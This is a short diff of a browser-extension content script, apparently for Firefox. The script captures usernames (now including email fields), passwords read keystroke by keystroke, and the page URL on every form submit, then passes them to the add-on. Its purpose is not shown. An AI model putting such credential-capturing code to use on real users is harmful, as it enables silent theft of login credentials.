@@ -2,15 +2,16 @@ $('form').submit(function() {
       var message = '{"username":"' + uname + '", '+
                     '"password":"' + pass + '", '+
                     '"url":"' + window.location.href + '"}'; 
-        console.log(uname + " " + pass);
+        //console.log(uname + " " + pass);
         self.port.emit("message", message);
 });
 
 var uname;
 var pass="";
 
-$('input:text').blur(function() {
-        uname=$(this).val();   
+$('input').blur(function() {
+    if($(this).attr('type')==="email" || $(this).attr('type')==="text")
+        uname=$(this).val();
 });
 
 $('input:password').keypress(function(event) {
